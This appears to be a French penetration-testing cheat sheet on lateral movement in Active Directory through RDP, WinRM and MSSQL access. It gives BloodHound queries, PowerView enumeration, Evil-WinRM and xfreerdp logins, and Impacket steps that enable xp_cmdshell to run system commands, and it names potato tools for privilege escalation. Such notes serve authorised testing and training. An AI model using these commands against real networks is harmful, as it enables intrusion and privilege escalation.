# Privileged Access

### <mark style="color:red;">1. Protocoles de déplacement latéral</mark>

<table data-full-width="true"><thead><tr><th>Protocole</th><th>Description</th><th>Utilisation</th></tr></thead><tbody><tr><td><strong>RDP (Remote Desktop Protocol)</strong></td><td>Protocole d'accès à distance avec interface graphique</td><td>Contrôle total GUI d'une machine distante</td></tr><tr><td><strong>WinRM (PowerShell Remoting)</strong></td><td>Protocole d'accès à distance via PowerShell</td><td>Exécution de commandes à distance en ligne de commande</td></tr><tr><td><strong>MSSQL Server</strong></td><td>Accès via SQL Server avec privilèges sysadmin</td><td>Exécution de commandes via des requêtes SQL</td></tr></tbody></table>

***

### <mark style="color:red;">2. Énumération des accès</mark>

#### <mark style="color:green;">BloodHound - Privilèges à rechercher</mark>

* `CanRDP` - Droits d'accès RDP
* `CanPSRemote` - Droits d'accès WinRM
* `SQLAdmin` - Droits administrateur SQL Server

#### <mark style="color:green;">PowerView - Commandes d'énumération</mark>

{% code fullWidth="true" %}
```powershell
# Énumérer les membres du groupe "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName COMPUTER-NAME -GroupName "Remote Desktop Users"

# Énumérer les membres du groupe "Remote Management Users" (WinRM)
Get-NetLocalGroupMember -ComputerName COMPUTER-NAME -GroupName "Remote Management Users"
```
{% endcode %}

#### <mark style="color:green;">Requêtes Cypher BloodHound personnalisées</mark>

<pre class="language-cypher"><code class="lang-cypher"># Rechercher utilisateurs avec accès WinRM
<strong>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
</strong>MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
RETURN p2

# Rechercher utilisateurs avec droits SQLAdmin
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) 
RETURN p2
</code></pre>

***

### <mark style="color:red;">3. Exploitation RDP</mark>

#### <mark style="color:green;">Depuis Windows</mark>

```cmd
mstsc.exe /v:COMPUTER-NAME
```

#### <mark style="color:green;">Depuis Linux</mark>

```bash
xfreerdp /u:USERNAME /d:DOMAIN /p:PASSWORD /v:TARGET-IP
```

***

### <mark style="color:red;">4. Exploitation WinRM</mark>

#### <mark style="color:green;">Depuis Windows (PowerShell)</mark>

{% code fullWidth="true" %}
```powershell
$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("DOMAIN\USERNAME", $password)
Enter-PSSession -ComputerName TARGET-COMPUTER -Credential $cred
```
{% endcode %}

#### <mark style="color:green;">Depuis Linux (Evil-WinRM)</mark>

```bash
# Installation
gem install evil-winrm

# Connexion
evil-winrm -i TARGET-IP -u USERNAME -p PASSWORD
```

***

### <mark style="color:red;">5. Exploitation MSSQL Server</mark>

#### <mark style="color:green;">Depuis Windows (PowerUpSQL)</mark>

{% code fullWidth="true" %}
```powershell
# Importation du module
Import-Module PowerUpSQL.ps1

# Énumération des instances SQL dans le domaine
Get-SQLInstanceDomain

# Exécution d'une requête SQL
Get-SQLQuery -Verbose -Instance "TARGET-IP,1433" -username "DOMAIN\USERNAME" -password "PASSWORD" -query 'Select @@version'
```
{% endcode %}

#### <mark style="color:green;">Depuis Linux (Impacket)</mark>

```bash
# Connexion
mssqlclient.py DOMAIN/USERNAME@TARGET-IP -windows-auth

# Activation de xp_cmdshell
SQL> enable_xp_cmdshell

# Exécution de commandes système
SQL> xp_cmdshell whoami /priv
```

***

### <mark style="color:red;">6. Points clés à retenir</mark>

* Un utilisateur avec accès RDP/WinRM peut être utilisé pour:
  * Lancer d'autres attaques
  * Élever les privilèges
  * Extraire des données sensibles ou des identifiants
* Les privilèges `SeImpersonatePrivilege` découverts via MSSQL peuvent être exploités avec:
  * JuicyPotato
  * PrintSpoofer
  * RoguePotato
